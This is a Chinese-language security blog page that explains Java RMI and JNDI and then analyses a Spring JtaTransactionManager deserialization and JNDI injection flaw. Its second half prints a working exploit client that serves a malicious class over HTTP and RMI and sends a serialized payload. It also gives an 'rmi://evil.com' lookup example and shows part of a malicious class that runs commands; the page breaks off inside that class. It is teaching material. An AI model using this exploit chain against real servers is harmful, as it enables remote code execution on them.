<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Java RMI"><meta name="keywords" content="Java"><meta name="author" content="Isabellae"><meta name="copyright" content="Isabellae"><title>Java RMI学习 | Isabellae's Blog</title><link rel="shortcut icon" href="/terminal_emulator.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-RMI的定义"><span class="toc-number">2.</span> <span class="toc-text">Java RMI的定义</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#原理"><span class="toc-number">3.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI包含部分："><span class="toc-number">3.1.</span> <span class="toc-text">RMI包含部分：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-RMI示例"><span class="toc-number">4.</span> <span class="toc-text">Java RMI示例</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#远程方法调用"><span class="toc-number">4.1.</span> <span class="toc-text">远程方法调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#远程对象"><span class="toc-number">4.2.</span> <span class="toc-text">远程对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#客户端"><span class="toc-number">4.3.</span> <span class="toc-text">客户端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何获取Stub"><span class="toc-number">4.4.</span> <span class="toc-text">如何获取Stub</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务端"><span class="toc-number">4.5.</span> <span class="toc-text">服务端</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#运行实例"><span class="toc-number">5.</span> <span class="toc-text">运行实例</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结一下RMI-流程"><span class="toc-number">6.</span> <span class="toc-text">总结一下RMI 流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#动态加载类"><span class="toc-number">7.</span> <span class="toc-text">动态加载类</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI"><span class="toc-number">8.</span> <span class="toc-text">JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI注入"><span class="toc-number">8.1.</span> <span class="toc-text">JNDI注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring-JNDI注入与反序列化"><span class="toc-number">9.</span> <span class="toc-text">Spring JNDI注入与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">9.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-number">9.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#客户端-1"><span class="toc-number">9.2.1.</span> <span class="toc-text">客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务端-1"><span class="toc-number">9.2.2.</span> <span class="toc-text">服务端</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地复现"><span class="toc-number">9.3.</span> <span class="toc-text">本地复现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#引用"><span class="toc-number">10.</span> <span class="toc-text">引用</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/IMG_20190204_224358.jpg"></div><div class="author-info__name text-center">Isabellae</div><div class="author-info__description text-center">Cyber Security</div><div class="follow-button"><a href="https://github.com/is4b3lla3" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">10</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">8</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">7</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友情链接</div><a class="author-info-links__name text-center" href="http://www.y1nhui.com/" target="_blank" rel="noopener">y1nhui</a><a class="author-info-links__name text-center" href="http://www.adminxt.com/" target="_blank" rel="noopener">adminxt</a><a class="author-info-links__name text-center" href="https://www.zhaosimeng.cn/" target="_blank" rel="noopener">守卫者安全</a><a class="author-info-links__name text-center" href="https://v0w.top/" target="_blank" rel="noopener">v0wkeep3r</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/2700d379fda645e77d754fc4956024c6.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Isabellae's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/links">links</a><a class="site-page" href="/about">About</a></span></div><div id="post-info"><div id="post-title">Java RMI学习</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-06-27</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Java/">Java</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是一个学习Java反序列化漏洞的一个入门文章，总结学习Java RMI调用以及一个Spring JNDI注入与反序列化漏洞原理</p>
<a id="more"></a>

<h1 id="Java-RMI的定义"><a href="#Java-RMI的定义" class="headerlink" title="Java RMI的定义"></a>Java RMI的定义</h1><p>Java远程方法调用，即Java RMI (Java Remote Method Invocation)，是Java编程语言里，一种用于<strong>实现远程过程调用的应用程序编程接口</strong>。它使客户机上运行的程序可以直接调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。</p>
<p>RMI（Remote Method Invocation）为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</p>
<p>在RMI中<strong>对象是通过序列化方式进行编码传输的</strong>。（基于序列化和反序列化就可能存在反序列化漏洞了）<br><strong>RMI的基础是接口，RMI构架基于一个重要的原理：定义接口和<em>定义接口的具体</em>实现是分开的。</strong></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>RMI能让一个Java程序去调用网络中另一台计算机的Java对象的方法，那么调用的效果就像是在本机上调用一样。通俗的讲：A机器上面有一个class，通过远程调用，B机器调用这个class 中的方法。</p>
<h2 id="RMI包含部分："><a href="#RMI包含部分：" class="headerlink" title="RMI包含部分："></a>RMI包含部分：</h2><ol>
<li>远程服务的接口定义</li>
<li>远程服务接口的具体实现</li>
<li>存根（Stub）和骨架（Skeleton）文件</li>
<li>一个运行远程服务的服务器</li>
<li>一个RMI命名服务，它允许客户端去发现这个远程服务</li>
<li>类文件的提供者（一个HTTP或者FTP服务器）</li>
<li>一个需要这个远程服务的客户端程序<h1 id="Java-RMI示例"><a href="#Java-RMI示例" class="headerlink" title="Java RMI示例"></a>Java RMI示例</h1><h2 id="远程方法调用"><a href="#远程方法调用" class="headerlink" title="远程方法调用"></a>远程方法调用</h2>远程方法调用是分布式编程中的一个基本思想。而RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过<strong>序列化方式</strong>进行编码传输的。<h2 id="远程对象"><a href="#远程对象" class="headerlink" title="远程对象"></a>远程对象</h2></li>
<li>首先我们定义一个远程接口<code>Clock.java</code><ul>
<li>定义远程服务接口（interface）</li>
<li>远程接口必须继承Remote</li>
<li>远程方法必须抛出RemoteException<blockquote>
<p>在Java中，只要一个类extends了java.rmi.Remote接口，即可成为存在于服务器端的远程对象， 供客户端访问并提供一定的服务。JavaDoc描述：Remote 接口用于标识其方法可以从非本地虚拟机上调用的接口。任何远程对象都必须直接或间接实现此接口。只有在“远程接口” 扩展 java.rmi.Remote 的接口）中指定的这些方法才可被远程调用</p>
</blockquote>
</li>
</ul>
</li>
</ol>
<p><img src="./Clock.png" alt="Clock.java"><br>2. 接下来定义远程接口的实现<code>ClockImpl.java</code><br><img src="./ClockImpl.png" alt="ClockImpl.java"></p>
<blockquote>
<ul>
<li>远程对象必须实现java.rmi.server.UniCastRemoteObject类，这样才能保证客户端访问获得远程对象时，</li>
<li>该远程对象将会把自身的一个拷贝以Socket的形式传输给客户端，此时客户端所获得的这个拷贝称为”stub”(存根)，</li>
<li>而服务器端本身已存在的远程对象则称之为”Skeleton”(骨架)。其实此时的存根是客户端的一个代理，用于与服务器端的通信，</li>
<li>而骨架也可认为是服务器端的一个代理，用于接收客户端的请求之后调用远程方法来响应客户端的请求。</li>
</ul>
</blockquote>
<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><ol>
<li>根据主机和端口，获得服务注册器的引用</li>
<li>注册器根据服务名称查找对应的服务，并返回给客户端（Stub—-客户端代理）</li>
<li>客户对象通过Stub发送请求</li>
<li>Stub将调用信息（变量、方法名称等）打包，通过网络将它发送给Skeleton（服务辅助对象）</li>
<li>Skeleton将来自Stub的信息解包，找出被调用的方法（以及在哪个对象内），然后调用真正的服务对象上的真正方法</li>
<li>服务对象执行方法，获得返回结果，并将结果返回给Skeleton</li>
<li>Skeleton将返回结果打包，通过网络返回给Stub（注意返回结果必须是可序列化的）</li>
<li>Stub接受到数据后解包，返回给客户对象。</li>
<li>客户端所在的JVM启动后，可以多次调用服务端对象的方法。<blockquote>
<p>stub和skeleton代理都是在服务端程序中由RMI系统动态生成,服务端程序只需要继承java.rmi.server.UnicastRemoteObject类即可</p>
</blockquote>
<h2 id="如何获取Stub"><a href="#如何获取Stub" class="headerlink" title="如何获取Stub"></a>如何获取Stub</h2></li>
<li>调用某个远程服务上的方法，向远程服务获取存根<br>JDK提供了一个RMI注册表（RMIRegistry），RMIRegistry也是一个远程对象，默认监听在1099端口上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。</li>
</ol>
<ul>
<li>要注册远程对象，需要RMI URL和一个远程对象的引用。</li>
<li><code>LocateRegistry.getRegistry()</code>会使用给定的主机和端口等信息本地创建一个Stub对象作为Registry远程对象的代理，从而启动整个远程调用逻辑。服务端应用程序可以向RMI注册表中注册远程对象，然后客户端向RMI注册表查询某个远程对象名称，来获取该远程对象的Stub。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建Clock实例</span></span><br><span class="line">Clock impl = <span class="keyword">new</span> ClockImpl();</span><br><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">registry.bind(<span class="string">"Clock"</span>,stub);</span><br></pre></td></tr></table></figure>
从客户端角度来看服务端，服务端开启了两个端口，一个是RMI注册端口默认为1099，另一个是远程对象通信端口，由JVM随机分配，</li>
<li>客户端代码<code>ClockClient.java</code><br><img src="./ClockClient.png" alt="ClockClient.java"></li>
</ul>
<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>Clock是暴露在网络中的接口，ClockImpl是一个服务端远程对象，重写了一个Hello方法供远程调用。它没有继承UnicastRemoteObject类，我们可以在构造方法中调用<code>UnicastRemoteObject.exportObject()</code>例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ClockImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">    UnicastRemoteObject.exportObject(<span class="keyword">this</span>, <span class="number">1099</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>也可以稍后在服务端代码中调用</p>
<ul>
<li>服务端代码<code>ClockServer.java</code><br><img src="./ClockServer.png" alt="ClockServer.java"><blockquote>
<p>注册远程对象,向客户端提供远程对象服务远程对象是在远程服务上创建的，你无法确切地知道远程服务器上的对象的名称。但是，将远程对象注册到RMI Service之后，客户端就可以通过RMI Service请求到该远程服务对象的stub了，利用stub代理就可以访问远程服务对象了</p>
</blockquote>
</li>
</ul>
<ul>
<li>服务端的流程是：</li>
</ul>
<ol>
<li>定义远程服务接口（interface）</li>
<li>定义远程服务接口的具体实现（implement）</li>
<li>将该远程服务注册到RMI命名服务上（指定主机及端口）（registry）</li>
<li>启动远程服务所在的jvm线程，此时服务端处于运行中。</li>
</ol>
<h1 id="运行实例"><a href="#运行实例" class="headerlink" title="运行实例"></a>运行实例</h1><ol>
<li>先运行服务端<br><img src="./server.png" alt="server"></li>
<li>运行客户端，调用成功<br><img src="./client.png" alt="client"></li>
</ol>
<h1 id="总结一下RMI-流程"><a href="#总结一下RMI-流程" class="headerlink" title="总结一下RMI 流程"></a>总结一下RMI 流程</h1><ol>
<li>服务端ClockImpl()继承Clock()创建远程对象</li>
<li>服务端CLock()注册远程对象</li>
<li>客户端访问服务器b并查找相应远程对象</li>
<li>服务端将stub(存根返回)客户端</li>
<li>客户端调用stub(存根)的方法</li>
<li>stub(存根)作为代理与服务端骨架通信   //骨架作为服务端代理</li>
<li>骨架代理调用ClockImpl相应方法</li>
<li>骨架将结果返回给客户端的存根</li>
<li>存根返回给客户端<br><img src="./%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.jpg" alt="RMI体系结构"></li>
</ol>
<h1 id="动态加载类"><a href="#动态加载类" class="headerlink" title="动态加载类"></a>动态加载类</h1><p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。</p>
<ul>
<li><strong>JNDI注入的利用方法中也借助了动态加载类的思路</strong>。</li>
<li>这里涉及到的角色：客户端、RMI注册表、远程对象服务器、托管class文件的Web服务器可以分别位于不同的主机上：<br><img src="./%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%B1%BB.png" alt="动态加载类"><h1 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h1>JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层<strong>支持RMI远程对象</strong>，RMI注册的服务可以通过JNDI接口来访问和调用。</li>
<li>其实JNDI就如同Windows系统的注册表一样:<code>键:值</code><br><img src="./JNDI.png" alt="JNDI"><blockquote>
<p>JNDI：<code>路径+名称:对象名称</code><br>JNDI支持多种命名和目录提供程序（Naming and Directory Providers），RMI注册表服务提供程序（RMI Registry Service Provider）允许通过JNDI应用接口对RMI中注册的远程对象进行访问操作。将RMI服务绑定到JNDI的一个好处是更加透明、统一和松散耦合，RMI客户端直接通过URL来定位一个远程对象，而且该RMI服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。</p>
</blockquote>
</li>
<li>JNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入就出现在客户端的lookup()函数中，如果<code>lookup()</code>的参数可控就可能被攻击。<h2 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过<code>References</code>类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的<code>object factory</code>，最终通过<code>factory</code>类将<code>reference</code>转换为具体的对象实例。</li>
<li>利用流程</li>
</ul>
<ol>
<li>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</li>
<li>攻击者控制URI参数为恶意的RMI服务地址，如：rmi://evil.com//name；</li>
<li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>
<li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</li>
<li>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果.<br>攻击目标扮演的相当于是JNDI客户端的角色，攻击者通过搭建一个恶意的RMI服务端来实施攻击。</li>
</ol>
<h1 id="Spring-JNDI注入与反序列化"><a href="#Spring-JNDI注入与反序列化" class="headerlink" title="Spring JNDI注入与反序列化"></a>Spring JNDI注入与反序列化</h1><p>Spring框架的spring-tx.jar中的JtaTransactionManager.readObject()中就存在这个问题，当进行对象反序列化的时候，会执行lookup()操作，其中lookup()参数可控导致了RCE。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境使用的是Github上<a href="https://github.com/zerothoughts/spring-jndi" target="_blank" rel="noopener">zerothoughts</a>提供的POC，主要功能就是一个简单的Client、Server端，运行在Spring环境下。</p>
<ul>
<li>其中Server端开启一个Socket连接，读取Client发送的序列化数据，然后反序列化得到对象</li>
<li>Client负责发送序列化数据以及实现一个JNDI注入来加载恶意类<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2>Spring框架的spring-tx.jar中的JtaTransactionManager.readObject()中，当进行对象反序列化的时候，会执行lookup()操作而且参数可控，可以进行JNDI注入。<h3 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.net.httpserver.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String serverAddress = args[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">            String localAddress= args[<span class="number">2</span>];</span><br><span class="line">            <span class="comment">//启动web server，提供远程下载要调用类的接口</span></span><br><span class="line">            System.out.println(<span class="string">"Starting HTTP server"</span>);</span><br><span class="line">            HttpServer httpServer = HttpServer.create(<span class="keyword">new</span> InetSocketAddress(<span class="number">8088</span>), <span class="number">0</span>);</span><br><span class="line">            httpServer.createContext(<span class="string">"/"</span>,<span class="keyword">new</span> HttpFileHandler());</span><br><span class="line">            httpServer.setExecutor(<span class="keyword">null</span>);</span><br><span class="line">            httpServer.start();</span><br><span class="line">            <span class="comment">//下载恶意类的地址 http://127.0.0.1:8088/ExportObject.class</span></span><br><span class="line">            System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">            Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Reference reference = <span class="keyword">new</span> javax.naming.Reference(<span class="string">"ExportObject"</span>,<span class="string">"ExportObject"</span>,<span class="string">"http://127.0.0.1:8088/"</span>);</span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(reference);</span><br><span class="line">            registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"Connecting to server "</span>+serverAddress+<span class="string">":"</span>+port);</span><br><span class="line">            Socket socket=<span class="keyword">new</span> Socket(serverAddress,port);</span><br><span class="line">            System.out.println(<span class="string">"Connected to server"</span>);</span><br><span class="line">            <span class="comment">//jndi的调用地址</span></span><br><span class="line">            String jndiAddress = <span class="string">"rmi://"</span>+localAddress+<span class="string">":1099/Object"</span>;</span><br><span class="line">            org.springframework.transaction.jta.JtaTransactionManager object = <span class="keyword">new</span> org.springframework.transaction.jta.JtaTransactionManager();</span><br><span class="line">            object.setUserTransactionName(jndiAddress);</span><br><span class="line">            <span class="comment">//发送payload</span></span><br><span class="line">            System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">            objectOutputStream.writeObject(object);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>可以看到客户端首先启动一个HTTP服务来提供JNDI将要远程加载的恶意类</li>
<li>接下来注册并启动RMI服务，然后通过<code>References</code>类 绑定 我们HTTP服务提供的恶意类</li>
<li>最后就是RMI的调用过程了</li>
</ul>
<h3 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitableServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(Integer.parseInt(<span class="string">"1111"</span>));</span><br><span class="line">            System.out.println(<span class="string">"Server started on port "</span> + serverSocket.getLocalPort());</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="comment">//等待连接</span></span><br><span class="line">                Socket socket = serverSocket.accept();</span><br><span class="line">                System.out.println(<span class="string">"Connection received from "</span> + socket.getInetAddress());</span><br><span class="line">                ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//读取对象</span></span><br><span class="line">                    Object object = objectInputStream.readObject();</span><br><span class="line">                    System.out.println(<span class="string">"Read object "</span> + object);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"Exception caught while reading object"</span>);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>服务端的代码很简单，就是一个读取序列化数据再进行反序列化的过程<blockquote>
<p>服务端收到客户端的payload，然后去访问客户端RMI服务，客户端RMI服务访问HTTP服务提供的恶意类，读取恶意类然后返回给Server，Server端接收序列化数据进行反序列化然后触发我们构造的恶意代码造成RCE</p>
</blockquote>
</li>
</ul>
<h2 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h2><p>我们首先启动服务端，再启动客户端，<br><img src="./ExpServer.png" alt="ExpServer"></p>
<p><img src="1.png" alt=""><br><img src="2.png" alt=""><br><img src="3.png" alt=""><br><img src="4.png" alt=""><br><img src="5.png" alt=""><br>以上就是调用栈了</p>
<ul>
<li>恶意类<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExportObject</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String sb = <span class="string">""</span>;</span><br><span class="line">		BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());</span><br><span class="line">		BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">		String lineStr;</span><br><span class="line">		<span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="keyword">null</span>)</span><br><span class="line">			sb += lineStr + <span class="string">"\n"</span>;</span><br><span class="line">		inBr.close();</span><br><span class="line">		in.close();</span><br><span class="line">		<span class="keyword">return</span> sb;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ExportObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String cmd=<span 